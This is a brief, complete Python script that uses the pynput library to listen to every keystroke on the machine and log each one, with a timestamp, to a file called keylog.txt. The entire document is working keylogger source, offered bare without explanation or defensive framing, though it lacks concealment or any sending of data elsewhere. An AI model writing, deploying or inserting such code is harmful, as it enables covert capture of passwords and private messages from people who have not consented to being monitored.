from pynput import keyboard
import logging
from datetime import datetime

# Set up logging
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")

# Function called on key press
def on_press(key):
    try:
        key_log = f"{key.char} pressed"
    except AttributeError:
        key_log = f"Special key {key} pressed"
    
    logging.info(key_log)  # Log to file

# Start the keyboard listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
